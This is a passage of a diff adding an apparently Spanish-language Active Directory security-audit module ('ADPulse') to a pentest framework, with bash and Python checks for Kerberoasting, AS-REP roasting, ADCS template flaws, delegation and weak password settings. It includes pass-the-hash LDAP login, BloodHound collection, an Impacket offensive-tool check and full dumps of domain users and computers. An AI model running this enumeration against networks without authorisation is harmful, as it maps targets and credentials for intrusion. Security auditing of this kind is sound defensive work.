+            "Get-ADGroupMember 'Domain Admins' | Get-ADUser -Properties mail | ?{\\$_.mail}"
+    else
+        _ad_ok "Domain Admins sin email (cuentas dedicadas correctamente separadas)"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 30: RECYCLE BIN DE AD HABILITADO
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[28/35] AD Recycle Bin habilitado"
+    local rb_data
+    rb_data=$(ldapsearch -x -LLL \
+        -H "ldap://${AD_DC_IP}:389" \
+        -D "${AD_USER_FULL}" \
+        -w "${AD_PASS}" \
+        -b "CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,${AD_BASE_DN}" \
+        "(objectClass=*)" cn msDS-EnabledFeatureBL 2>/dev/null)
+
+    if echo "$rb_data" | grep -qi "Recycle Bin"; then
+        _ad_ok "AD Recycle Bin habilitado (correcto — permite recuperación de objetos)"
+    else
+        _ad_finding "BAJO" "AD Recycle Bin No Habilitado" \
+            "<p>El Recycle Bin de Active Directory no está habilitado. Sin él, los objetos eliminados (usuarios, grupos, OUs) no pueden recuperarse fácilmente.</p>" \
+            "2.0" \
+            "Habilitar: Enable-ADOptionalFeature 'Recycle Bin Feature' -Scope ForestOrConfigurationSet -Target ${AD_DOMAIN_FQDN}" \
+            "Enable-ADOptionalFeature -Identity 'Recycle Bin Feature' -Scope ForestOrConfigurationSet -Target ${AD_DOMAIN_FQDN}"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 31: AUDITORÍA — Audit Policy configurada
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[29/35] Audit Policy — Configuración de auditoría"
+    # Verificar si hay GPO de auditoría avanzada configurada
+    local audit_gpo
+    audit_gpo=$(ldapsearch -x -LLL \
+        -H "ldap://${AD_DC_IP}:389" \
+        -D "${AD_USER_FULL}" \
+        -w "${AD_PASS}" \
+        -b "CN=Policies,CN=System,${AD_BASE_DN}" \
+        "(displayName=*Audit*)" cn displayName 2>/dev/null | grep -c "^dn:" || echo 0)
+
+    if (( audit_gpo == 0 )); then
+        _ad_finding "MEDIO" "Sin GPO de Auditoría Avanzada Detectada" \
+            "<p>No se detectaron GPOs con nombre relacionado a auditoría. Sin auditoría correcta:</p>
+            <ul><li>No hay logs de Logon/Logoff (Event 4624/4625)</li>
+            <li>No hay detección de Kerberoasting (Event 4769)</li>
+            <li>No hay alertas de DCSync (Event 4662)</li>
+            <li>No hay logs de Process Creation (Event 4688)</li></ul>" \
+            "5.5" \
+            "Implementar GPO de Advanced Audit Policy Configuration con: Account Logon, Account Management, DS Access, Logon/Logoff, Object Access, Policy Change, Privilege Use, System." \
+            "auditpol /get /category:* | Get-AuditPolicy -All"
+    else
+        _ad_ok "GPO de auditoría detectada"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 32: USUARIOS CON PASSWORD NOT REQUIRED
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[30/35] Cuentas con PASSWD_NOTREQD"
+    local notreq_data
+    notreq_data=$(_ldap "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
+        "cn sAMAccountName" 2>/dev/null)
+    local notreq_count
+    notreq_count=$(echo "$notreq_data" | grep -c "^dn:" || echo 0)
+
+    if (( notreq_count > 0 )); then
+        _ad_crit "${notreq_count} cuentas activas con PASSWD_NOTREQD"
+        local notreq_html="<p><b>${notreq_count} cuentas activas</b> con el flag <b>PASSWD_NOTREQD</b>. Estas cuentas pueden tener contraseña vacía o sin requisitos de complejidad.</p><ul>"
+        while IFS= read -r line; do
+            [[ "$line" =~ ^sAMAccountName:\ (.+) ]] && notreq_html+="<li><code>${BASH_REMATCH[1]}</code></li>"
+        done <<< "$notreq_data"
+        notreq_html+="</ul>"
+
+        _ad_finding "CRÍTICO" "PASSWD_NOTREQD — ${notreq_count} Cuentas Sin Contraseña Obligatoria" \
+            "$notreq_html" "9.0" \
+            "Remover flag PASSWD_NOTREQD de todas las cuentas. Verificar si tienen contraseña vacía. Cambiar contraseñas y aplicar política." \
+            "Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=32)' | Set-ADUser -Replace @{userAccountControl=512}"
+    else
+        _ad_ok "Sin cuentas PASSWD_NOTREQD"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 33: BLOODHOUND DATA COLLECTION (si disponible)
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[31/35] BloodHound — Recolección de datos de ataque paths"
+    if python3 -c "import bloodhound" 2>/dev/null || command -v bloodhound-python >/dev/null 2>&1; then
+        _ad_log "bloodhound-python disponible → recolectando..."
+        local bh_cmd="bloodhound-python"
+        command -v bloodhound-python >/dev/null 2>&1 || bh_cmd="python3 -m bloodhound"
+
+        "$bh_cmd" \
+            -u "${AD_USER}" \
+            -p "${AD_PASS}" \
+            -d "${AD_DOMAIN_FQDN}" \
+            -ns "${AD_DC_IP}" \
+            -c All \
+            --zip \
+            -o "${AD_OUT_DIR}/bloodhound/" 2>/dev/null && \
+            _ad_ok "BloodHound data recolectada en ${AD_OUT_DIR}/bloodhound/"
+
+        _ad_finding "INFO" "BloodHound — Datos Recolectados" \
+            "<p>Datos de BloodHound recolectados en <code>${AD_OUT_DIR}/bloodhound/</code>. Importar en BloodHound GUI para análisis visual de attack paths.</p>
+            <p>Queries útiles en BloodHound:
+            <ul><li>Find Shortest Paths to Domain Admins</li>
+            <li>Find Principals with DCSync Rights</li>
+            <li>Find AS-REP Roastable Users</li>
+            <li>Shortest Path to Unconstrained Delegation Systems</li></ul></p>" \
+            "N/A" \
+            "Instalar BloodHound: sudo apt install bloodhound" \
+            "bloodhound-python -u ${AD_USER} -p '${AD_PASS}' -d ${AD_DOMAIN_FQDN} -ns ${AD_DC_IP} -c All --zip"
+    else
+        _ad_finding "INFO" "BloodHound No Disponible" \
+            "<p>Instalar para análisis completo de attack paths:</p>
+            <code>pip3 install bloodhound --break-system-packages</code><br>
+            <code>sudo apt install bloodhound</code>" \
+            "N/A" "pip3 install bloodhound --break-system-packages" \
+            "bloodhound-python -u ${AD_USER} -p '${AD_PASS}' -d ${AD_DOMAIN_FQDN} -ns ${AD_DC_IP} -c All"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 34: IMPACKET — Verificar herramientas disponibles
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[32/35] Impacket — Verificación de herramientas ofensivas"
+    local impacket_tools=(GetUserSPNs GetNPUsers secretsdump psexec smbclient wmiexec atexec dcomexec)
+    local avail=() missing=()
+    for tool in "${impacket_tools[@]}"; do
+        if command -v "impacket-${tool}" >/dev/null 2>&1 || \
+           command -v "${tool}.py" >/dev/null 2>&1; then
+            avail+=("$tool")
+        else
+            missing+=("$tool")
+        fi
+    done
+    _ad_log "Impacket disponible: ${#avail[@]}/${#impacket_tools[@]} herramientas"
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 35: ENUMERACIÓN COMPLETA — Volcar datos para análisis offline
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[33/35] Dump completo de usuarios del dominio"
+    _ldap "(objectClass=user)" \
+        "sAMAccountName cn mail department title lastLogonTimestamp userAccountControl pwdLastSet" \
+        > "${AD_OUT_DIR}/all_users.txt" 2>/dev/null
+    local user_total
+    user_total=$(grep -c "^dn:" "${AD_OUT_DIR}/all_users.txt" 2>/dev/null || echo 0)
+    _ad_log "Usuarios exportados: ${user_total} → ${AD_OUT_DIR}/all_users.txt"
+
+    _ad_log "[34/35] Dump de grupos y membresías"
+    _ldap "(objectClass=group)" "cn description member managedBy" \
+        > "${AD_OUT_DIR}/all_groups.txt" 2>/dev/null
+
+    _ad_log "[35/35] Dump de equipos del dominio"
+    _ldap "(objectClass=computer)" \
+        "cn dNSHostName operatingSystem operatingSystemVersion lastLogonTimestamp" \
+        > "${AD_OUT_DIR}/all_computers.txt" 2>/dev/null
+    local comp_total
+    comp_total=$(grep -c "^dn:" "${AD_OUT_DIR}/all_computers.txt" 2>/dev/null || echo 0)
+    _ad_log "Equipos exportados: ${comp_total} → ${AD_OUT_DIR}/all_computers.txt"
+
+    # ════════════════════════════════════════════════════════════
+    # RESUMEN FINAL ADPULSE
+    # ════════════════════════════════════════════════════════════
+    echo
+    echo -e "${C_PUR}  ╔════════════════════════════════════════════╗${C_RST}"
+    echo -e "${C_PUR}  ║       ADPulse — Resumen del Análisis        ║${C_RST}"
+    echo -e "${C_PUR}  ╚════════════════════════════════════════════╝${C_RST}"
+    echo
+    echo -e "  Dominio  : ${C_YEL}${AD_DOMAIN_FQDN}${C_RST}"
+    echo -e "  DC       : ${C_YEL}${AD_DC_IP}${C_RST}"
+    echo -e "  Usuarios : ${C_CYN}${user_total}${C_RST}"
+    echo -e "  Equipos  : ${C_CYN}${comp_total}${C_RST}"
+    echo
+    echo -e "  ${C_RED}Críticos  : ${AD_CRITICAL}${C_RST}"
+    echo -e "  ${C_YEL}Altos     : ${AD_HIGH}${C_RST}"
+    echo -e "  ${C_CYN}Medios    : ${AD_MEDIUM}${C_RST}"
+    echo -e "  ${C_DIM}Bajos/Info: $((AD_LOW + AD_INFO))${C_RST}"
+    echo
+
+    # Kerberoastable
+    if (( ${#AD_KERBEROASTABLE[@]} > 0 )); then
+        echo -e "  ${C_RED}[💥 PRIORIDAD]${C_RST} Kerberoastable: ${AD_KERBEROASTABLE[*]}"
+    fi
+    if (( ${#AD_ASREPROASTABLE[@]} > 0 )); then
+        echo -e "  ${C_RED}[💥 PRIORIDAD]${C_RST} AS-REP Roastable: ${AD_ASREPROASTABLE[*]}"
+    fi
+    if (( ${#AD_ADCS_TEMPLATES[@]} > 0 )); then
+        echo -e "  ${C_RED}[💥 PRIORIDAD]${C_RST} ADCS vulnerables: ${AD_ADCS_TEMPLATES[*]}"
+    fi
+
+    echo
+    echo -e "  Archivos generados:"
+    echo -e "  ${C_CYN}${AD_OUT_DIR}/all_users.txt${C_RST}      — todos los usuarios"
+    echo -e "  ${C_CYN}${AD_OUT_DIR}/all_groups.txt${C_RST}     — todos los grupos"
+    echo -e "  ${C_CYN}${AD_OUT_DIR}/all_computers.txt${C_RST}  — todos los equipos"
+    echo -e "  ${C_CYN}${AD_OUT_DIR}/kerberoastable.txt${C_RST} — SPNs para crackear"
+    [[ -f "${AD_OUT_DIR}/gpos.txt" ]] && \
+        echo -e "  ${C_CYN}${AD_OUT_DIR}/gpos.txt${C_RST}             — GPOs del dominio"
+    echo
+
+    # Guardar intel para el reporte
+    intel_log "ADPulse: Críticos=${AD_CRITICAL} Altos=${AD_HIGH} Medios=${AD_MEDIUM} | Kerberoastable=${#AD_KERBEROASTABLE[@]} | ADCS ESC=${#AD_ADCS_TEMPLATES[@]}"
+}
+
+
+
+# ════════════════════════════════════════════════════════════════
+# VARIABLES INTEL — ACTIVE DIRECTORY
+# ════════════════════════════════════════════════════════════════
+INTEL_AD_DOMAIN=""              # dominio detectado: corp.local
+INTEL_AD_DC=""                  # IP del Domain Controller
+INTEL_AD_USERS=()               # usuarios encontrados
+INTEL_AD_ADMINS=()              # usuarios en grupos privilegiados
+INTEL_AD_KERBEROASTABLE=()      # SPNs kerberoasteables
+INTEL_AD_ASREP_USERS=()         # usuarios sin pre-auth Kerberos
+INTEL_AD_PASSWORD_POLICY=""     # política de contraseñas
+INTEL_AD_ADCS_FOUND=false       # ADCS detectado
+INTEL_AD_ADCS_TEMPLATES=()      # templates ADCS vulnerables
+INTEL_AD_LAPS_DEPLOYED=false    # LAPS está instalado
+INTEL_AD_UNCONSTRAINED=()       # máquinas con delegación sin restricciones
+INTEL_AD_CONSTRAINED=()         # cuentas con delegación restringida
+INTEL_AD_RBCD=()                # Resource-Based Constrained Delegation
+INTEL_AD_NULL_SESSIONS=false    # sesiones null en LDAP
+INTEL_AD_CREDS=""               # "user:pass" si el usuario proveyó credenciales
+
+# ════════════════════════════════════════════════════════════════
+# MÓDULO 45: ADPULSE — Active Directory Security Auditor
+# 35 tipos de misconfiguraciones | LDAP read-only
+# ════════════════════════════════════════════════════════════════
+modulo_adpulse() {
+    # ── Activación: requiere puerto 88 (Kerberos) o 389 (LDAP) ──
+    echo "$OPEN_PORTS_CSV" | grep -qE "(^|,)(88|389|636|3268|3269)(,|$)" || {
+        [[ "$INTEL_OS" == "windows" ]] || return
+    }
+
+    log "MÓDULO 45: ADPulse — Active Directory Security Auditor"
+    tip "35 tipos de misconfiguraciones AD: Kerberoasting, ADCS, Delegation, ACLs, Password Policy y más."
+    echo -e "  ${C_YEL}NOTA:${C_RST} Requiere autenticación para auditoría completa."
+    echo -e "  ${C_DIM}Auditoría de solo lectura. No modifica nada en el AD.${C_RST}"
+    echo
+
+    # ── Detectar DC ──────────────────────────────────────────────
+    INTEL_AD_DC="${TARGET}"
+
+    # ── Intentar detectar dominio desde LDAP anónimo ─────────────
+    local ldap_base=""
+    ldap_base=$(python3 -c "
+import socket, struct, sys
+try:
+    # Enviar LDAP anonymous rootDSE query
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(5)
+    s.connect(('${TARGET}', 389))
+    # Simple LDAP search request for defaultNamingContext
+    pkt = bytes.fromhex('300c020101600702010304000480')
+    s.send(pkt)
+    resp = s.recv(4096)
+    s.close()
+    # Buscar patrón DC= en la respuesta
+    import re
+    match = re.search(b'DC=[^,\x00]+(?:,DC=[^,\x00]+)+', resp)
+    if match:
+        print(match.group(0).decode('utf-8','ignore'))
+except:
+    pass
+" 2>/dev/null)
+
+    # Alternativa: detectar dominio via nmap o CME results
+    if [[ -z "$ldap_base" ]]; then
+        ldap_base=$(grep -oiE "DC=[A-Z0-9]+,DC=[A-Z0-9]+" "${OUTPUT_DIR}/recon/cme_results.txt" 2>/dev/null | head -1)
+    fi
+    if [[ -z "$ldap_base" ]]; then
+        ldap_base=$(grep -oiE "Domain: [a-z0-9\.-]+" "${OUTPUT_DIR}/nmap/scan_version.nmap" 2>/dev/null | \
+            head -1 | awk '{print $2}' | \
+            python3 -c "import sys; d=sys.stdin.read().strip(); parts=d.split('.'); print(','.join(['DC='+p for p in parts if p]))" 2>/dev/null)
+    fi
+
+    [[ -z "$ldap_base" ]] && {
+        warn "No se pudo detectar base LDAP automáticamente."
+        echo -ne "  ${C_YEL}Introduce la base LDAP (ej: DC=corp,DC=local) o Enter para saltar: ${C_RST}"
+        read -r ldap_base
+        [[ -z "$ldap_base" ]] && { warn "ADPulse: Base LDAP no disponible. Saltando."; return; }
+    }
+
+    # Extraer nombre de dominio legible
+    INTEL_AD_DOMAIN=$(echo "$ldap_base" | python3 -c "
+import sys,re
+b = sys.stdin.read().strip()
+parts = re.findall(r'DC=([^,]+)', b, re.I)
+print('.'.join(parts))
+" 2>/dev/null)
+
+    ok "DC: ${C_YEL}${INTEL_AD_DC}${C_RST} | Dominio: ${C_YEL}${INTEL_AD_DOMAIN}${C_RST} | Base: ${C_YEL}${ldap_base}${C_RST}"
+    echo
+
+    # ── Pedir credenciales (opcional) ────────────────────────────
+    local ad_user="" ad_pass="" ad_hash=""
+    echo -e "  ${C_BLU}Autenticación AD (opcional, Enter para anónimo):${C_RST}"
+    echo -ne "  ${C_DIM}Usuario (ej: jsmith o CORP\\\\jsmith): ${C_RST}"
+    read -r ad_user
+    if [[ -n "$ad_user" ]]; then
+        echo -ne "  ${C_DIM}Contraseña (o Enter para hash NTLM): ${C_RST}"
+        read -rs ad_pass; echo
+        if [[ -z "$ad_pass" ]]; then
+            echo -ne "  ${C_DIM}Hash NTLM (aad3b...): ${C_RST}"
+            read -r ad_hash
+        fi
+        INTEL_AD_CREDS="${ad_user}:${ad_pass:-${ad_hash}}"
+    fi
+    echo
+
+    # ── Verificar dependencias Python AD ─────────────────────────
+    local ldap3_ok=false impacket_ok=false
+    python3 -c "import ldap3" 2>/dev/null      && ldap3_ok=true
+    python3 -c "import impacket" 2>/dev/null   && impacket_ok=true
+
+    if [[ "$ldap3_ok" == "false" ]]; then
+        warn "ldap3 no instalado. Instalando..."
+        pip3 install ldap3 --break-system-packages -q 2>/dev/null && ldap3_ok=true || \
+            warn "No se pudo instalar ldap3. Instalar: pip3 install ldap3"
+    fi
+    if [[ "$impacket_ok" == "false" ]]; then
+        warn "impacket no instalado. Instalar para Kerberoasting: pip3 install impacket"
+    fi
+
+    # ── Crear el script Python principal ADPulse ─────────────────
+    local adpulse_py="${OUTPUT_DIR}/recon/adpulse_audit.py"
+    local adpulse_json="${OUTPUT_DIR}/recon/adpulse_results.json"
+
+    cat > "$adpulse_py" << 'PYAD'
+#!/usr/bin/env python3
+"""ADPulse — Active Directory Security Auditor
+Detecta 35 tipos de misconfiguraciones via LDAP read-only.
+"""
+import json, sys, re, os, argparse
+from datetime import datetime, timezone
+from collections import defaultdict
+
+# ── Colores para consola ──────────────────────────────────────
+R='\033[91m'; Y='\033[93m'; G='\033[92m'; B='\033[94m'
+C='\033[96m'; D='\033[2m'; W='\033[0m'; M='\033[95m'
+BOLD='\033[1m'
+
+findings = []
+stats = defaultdict(int)
+
+def finding(severity, category, title, detail, remediation, cvss=0.0, refs=None):
+    sev_colors = {"CRÍTICO": R+BOLD, "ALTO": R, "MEDIO": Y, "BAJO": G, "INFO": B}
+    color = sev_colors.get(severity, W)
+    icon  = {"CRÍTICO":"💀","ALTO":"🔴","MEDIO":"🟡","BAJO":"🟢","INFO":"ℹ️"}.get(severity,"•")
+    print(f"\n  {color}{icon} [{severity}]{W} {BOLD}{title}{W}")
+    print(f"  {D}{category}{W}")
+    if isinstance(detail, list):
+        for d in detail[:5]: print(f"    {C}→{W} {d}")
+        if len(detail) > 5: print(f"    {D}... y {len(detail)-5} más{W}")
+    else:
+        print(f"  {D}{detail[:200]}{W}")
+    print(f"  {Y}Remediar:{W} {remediation[:150]}")
+    stats[severity] += 1
+    findings.append({
+        "severity": severity, "category": category, "title": title,
+        "detail": detail if isinstance(detail, list) else [detail],
+        "remediation": remediation, "cvss": cvss,
+        "refs": refs or [], "timestamp": datetime.now(timezone.utc).isoformat()
+    })
+
+def section(name):
+    print(f"\n  {B}{'─'*56}{W}")
+    print(f"  {B}[*]{W} {BOLD}{name}{W}")
+
+# ── CONEXIÓN LDAP ─────────────────────────────────────────────
+def connect_ldap(dc, base_dn, user=None, password=None, ntlm_hash=None):
+    try:
+        import ldap3
+        from ldap3 import Server, Connection, ALL, NTLM, SIMPLE, ANONYMOUS
+        server = Server(dc, port=389, get_info=ALL, connect_timeout=10)
+
+        if user and (password or ntlm_hash):
+            # Intentar autenticación
+            if '\\' not in user and '@' not in user:
+                domain_part = base_dn.replace(',', '.').replace('DC=', '').replace('dc=', '')
+                domain_short = domain_part.split('.')[0].upper()
+                user_fqdn = f"{domain_short}\\{user}"
+            else:
+                user_fqdn = user
+
+            if ntlm_hash:
+                # Pass-the-Hash
+                lm_hash = "aad3b435b51404eeaad3b435b51404ee"
+                full_hash = f"{lm_hash}:{ntlm_hash}"
+                conn = Connection(server, user=user_fqdn, password=full_hash,
+                                  authentication=NTLM, auto_bind=True)
+            else:
+                conn = Connection(server, user=user_fqdn, password=password,
+                                  authentication=NTLM, auto_bind=True)
+        else:
+            # Anónimo
+            conn = Connection(server, authentication=ANONYMOUS, auto_bind=True)
+
+        return conn, ldap3
+    except Exception as e:
+        return None, None
+
+# ─────────────────────────────────────────────────────────────
+# LOS 35 CHECKS
+# ─────────────────────────────────────────────────────────────
+
+def check_01_null_session(conn, base_dn, ldap3):
+    """CHECK 1: LDAP Null/Anonymous Session"""
+    section("CHECK 01 — LDAP Anonymous Bind")
+    try:
+        conn.search(base_dn, '(objectClass=domain)',
+                    attributes=['distinguishedName','name','lockoutDuration','pwdProperties'])
+        if conn.entries:
+            finding("ALTO", "LDAP Exposure",
+                "LDAP Anonymous Bind Habilitado",
+                f"El servidor {args.dc} acepta conexiones LDAP anónimas. Permite enumerar usuarios, grupos y políticas.",
+                "Deshabilitar anonymous LDAP bind. GPO: Network access: Allow anonymous SID/name translation = Disabled",
+                7.5, ["https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-allow-anonymous-sidname-translation"])
+            return conn.entries
+        else:
+            print(f"  {G}[OK]{W} LDAP anonymous bind denegado.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} No se pudo verificar anonymous bind: {e}")
+    return []
+
+def check_02_password_policy(conn, base_dn, ldap3):
+    """CHECK 2: Password Policy débil"""
+    section("CHECK 02 — Password Policy")
+    try:
+        conn.search(base_dn, '(objectClass=domain)',
+                    attributes=['minPwdLength','pwdHistoryLength','maxPwdAge',
+                                'lockoutThreshold','lockoutDuration','pwdProperties'])
+        if not conn.entries: return
+        domain = conn.entries[0]
+        issues = []
+
+        min_len = int(str(domain.minPwdLength or 0))
+        hist    = int(str(domain.pwdHistoryLength or 0))
+        thresh  = int(str(domain.lockoutThreshold or 0))
+
+        if min_len < 12:
+            issues.append(f"Longitud mínima de contraseña: {min_len} caracteres (recomendado: 14+)")
+        if hist < 10:
+            issues.append(f"Historial de contraseñas: {hist} (recomendado: 24)")
+        if thresh == 0:
+            issues.append("Sin bloqueo de cuenta (lockoutThreshold = 0) → permite fuerza bruta ilimitada")
+        elif thresh > 10:
+            issues.append(f"Umbral de bloqueo alto: {thresh} intentos (recomendado: 3-5)")
+
+        # pwdProperties: bit 0 = complexity, bit 4 = no cleartext
+        pwd_props = int(str(domain.pwdProperties or 0))
+        if not (pwd_props & 1):
+            issues.append("Complejidad de contraseña DESHABILITADA")
+
+        INTEL_AD_PASSWORD_POLICY = f"minLen:{min_len} hist:{hist} lockout:{thresh} complexity:{bool(pwd_props&1)}"
+
+        if issues:
+            finding("MEDIO", "Password Policy",
+                "Política de Contraseñas Débil",
+                issues,
+                "Fortalecer via Default Domain Policy GPO: Mínimo 14 chars, complejidad ON, historial 24, lockout 5 intentos.",
+                5.5, ["https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management"])
+        else:
+            print(f"  {G}[OK]{W} Política de contraseñas robusta.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_03_kerberoastable(conn, base_dn, ldap3):
+    """CHECK 3: Cuentas Kerberoasteables (SPNs en cuentas de usuario)"""
+    section("CHECK 03 — Kerberoasting (SPNs en cuentas de usuario)")
+    try:
+        conn.search(base_dn,
+            '(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
+            attributes=['sAMAccountName','servicePrincipalName','pwdLastSet','description'])
+        if conn.entries:
+            accounts = []
+            for e in conn.entries:
+                spns = [str(s) for s in (e.servicePrincipalName.values if hasattr(e.servicePrincipalName,'values') else [e.servicePrincipalName])]
+                pwd_age = "desconocido"
+                if e.pwdLastSet and str(e.pwdLastSet) not in ['0','']:
+                    try:
+                        from ldap3.utils.conv import format_time
+                        accounts.append(f"{e.sAMAccountName} → SPNs: {', '.join(spns[:2])}")
+                    except:
+                        accounts.append(f"{e.sAMAccountName} → SPNs: {', '.join(spns[:2])}")
+                else:
+                    accounts.append(f"{e.sAMAccountName} → SPNs: {', '.join(spns[:2])}")
+
+            finding("CRÍTICO", "Kerberoasting",
+                f"Kerberoasting Posible: {len(conn.entries)} Cuenta(s) con SPN",
+                accounts,
+                "Usar MSAs/gMSAs para servicios. Contraseñas largas (+25 chars) para cuentas de servicio. Monitorear TGS requests.",
+                8.8, ["https://attack.mitre.org/techniques/T1558/003/",
+                      "https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/"])
+            return [str(e.sAMAccountName) for e in conn.entries]
+        else:
+            print(f"  {G}[OK]{W} Sin cuentas kerberoasteables.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+    return []
+
+def check_04_asrep_roasting(conn, base_dn, ldap3):
+    """CHECK 4: AS-REP Roasting (no pre-auth requerida)"""
+    section("CHECK 04 — AS-REP Roasting (DONT_REQ_PREAUTH)")
+    try:
+        # UAC bit 4194304 = DONT_REQ_PREAUTH
+        conn.search(base_dn,
+            '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(objectClass=computer)))',
+            attributes=['sAMAccountName','description','pwdLastSet'])
+        if conn.entries:
+            users = [str(e.sAMAccountName) for e in conn.entries]
+            finding("CRÍTICO", "AS-REP Roasting",
+                f"AS-REP Roasting: {len(users)} Cuenta(s) sin Pre-Autenticación Kerberos",
+                users,
+                "Habilitar pre-autenticación Kerberos en todas las cuentas. Solo deshabilitar si es estrictamente necesario.",
+                8.8, ["https://attack.mitre.org/techniques/T1558/004/"])
+            return users
+        else:
+            print(f"  {G}[OK]{W} Todas las cuentas requieren pre-autenticación Kerberos.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+    return []
+
+def check_05_adcs_vulnerabilities(conn, base_dn, ldap3):
+    """CHECK 5: ADCS — Certificados ESC1-ESC8"""
+    section("CHECK 05 — ADCS Certificate Templates (ESC1-ESC8)")
+    try:
+        pki_base = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{base_dn}"
+        conn.search(pki_base,
+            '(objectClass=pKICertificateTemplate)',
+            attributes=['cn','msPKI-Certificate-Name-Flag','msPKI-Enrollment-Flag',
+                        'msPKI-RA-Signature','pKIExtendedKeyUsage','nTSecurityDescriptor',
+                        'msPKI-Certificate-Application-Policy'])
+        if not conn.entries:
+            print(f"  {D}[i]{W} ADCS no detectado en este dominio (o sin permisos).")
+            return
+
+        print(f"  {C}[+]{W} ADCS detectado — analizando {len(conn.entries)} templates...")
+        vuln_templates = []
+
+        for template in conn.entries:
+            name = str(template.cn)
+            flags_name    = int(str(template['msPKI-Certificate-Name-Flag'] or 0))
+            flags_enroll  = int(str(template['msPKI-Enrollment-Flag'] or 0))
+            ra_sigs       = int(str(template['msPKI-RA-Signature'] or 1))
+            ekus          = [str(e) for e in (template.pKIExtendedKeyUsage.values if hasattr(template.pKIExtendedKeyUsage,'values') else [])]
+
+            issues = []
+
+            # ESC1: Subject Alternative Name (ENROLLEE_SUPPLIES_SUBJECT)
+            if flags_name & 1:  # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
+                if any(eku in ekus for eku in ['1.3.6.1.5.5.7.3.2', '1.3.6.1.5.5.7.48.1.1', '']):
+                    issues.append(f"ESC1: Enrollee puede especificar SAN arbitrario (flags_name={flags_name})")
+
+            # ESC2: Template con Any Purpose EKU o sin EKU
+            if '2.5.29.37.0' in ekus or not ekus:
+                issues.append(f"ESC2: Template con EKU 'Any Purpose' o sin EKU (peligroso)")
+
+            # ESC3: Template para Certificate Request Agent sin restricciones
+            if '1.3.6.1.4.1.311.20.2.1' in ekus and ra_sigs == 0:
+                issues.append(f"ESC3: Certificate Request Agent sin firmas requeridas")
+
+            # ESC4: Permisos de escritura en el template
+            # (simplificado — verificar msPKI-Certificate-Name-Flag write perms)
+
+            # ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 habilitado en CA
+            if flags_enroll & 64:  # CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL
+                issues.append(f"ESC6: Template permite SAN por email (potencialmente explotable)")
+
+            if issues:
+                vuln_templates.append(f"Template '{name}': {'; '.join(issues)}")
+
+        if vuln_templates:
+            finding("CRÍTICO", "ADCS / PKI",
+                f"ADCS Templates Vulnerables: {len(vuln_templates)} template(s) con misconfiguraciones",
+                vuln_templates,
+                "Revisar templates con Certify.exe /vulnerable. Deshabilitar EDITF_ATTRIBUTESUBJECTALTNAME2. Limitar permisos de enrollment.",
+                9.0, ["https://posts.specterops.io/certified-pre-owned-d95910965cd2",
+                      "https://attack.mitre.org/techniques/T1649/"])
+        else:
+            print(f"  {G}[OK]{W} Sin templates ADCS vulnerables detectados.")
+    except Exception as e:
+        if "No such object" in str(e):
+            print(f"  {D}[i]{W} ADCS no encontrado en este dominio.")
+        else:
+            print(f"  {Y}[?]{W} Error ADCS: {e}")
+
+def check_06_unconstrained_delegation(conn, base_dn, ldap3):
+    """CHECK 6: Delegación Sin Restricciones (Unconstrained Delegation)"""
+    section("CHECK 06 — Unconstrained Delegation")
+    try:
+        # UAC bit 524288 = TRUSTED_FOR_DELEGATION
+        conn.search(base_dn,
+            '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))',
+            attributes=['sAMAccountName','dNSHostName','operatingSystem'])
+        computers = [f"{e.sAMAccountName} ({e.dNSHostName})" for e in conn.entries]
+
+        # También buscar usuarios con unconstrained delegation
+        conn.search(base_dn,
+            '(&(objectClass=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=524288))',
+            attributes=['sAMAccountName','description'])
+        users_ud = [str(e.sAMAccountName) for e in conn.entries]
+
+        all_targets = computers + users_ud
+        if all_targets:
+            finding("CRÍTICO", "Kerberos Delegation",
+                f"Unconstrained Delegation en {len(all_targets)} objeto(s)",
+                all_targets,
+                "Migrar a Constrained o Resource-Based Constrained Delegation. Habilitar 'Account is sensitive and cannot be delegated' en cuentas privilegiadas.",
+                8.5, ["https://attack.mitre.org/techniques/T1134/001/",
+                      "https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/"])
+        else:
+            print(f"  {G}[OK]{W} Sin objetos con Unconstrained Delegation (excepto DCs).")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_07_constrained_delegation(conn, base_dn, ldap3):
+    """CHECK 7: Constrained Delegation mal configurada"""
+    section("CHECK 07 — Constrained Delegation (msDS-AllowedToDelegateTo)")
+    try:
+        conn.search(base_dn,
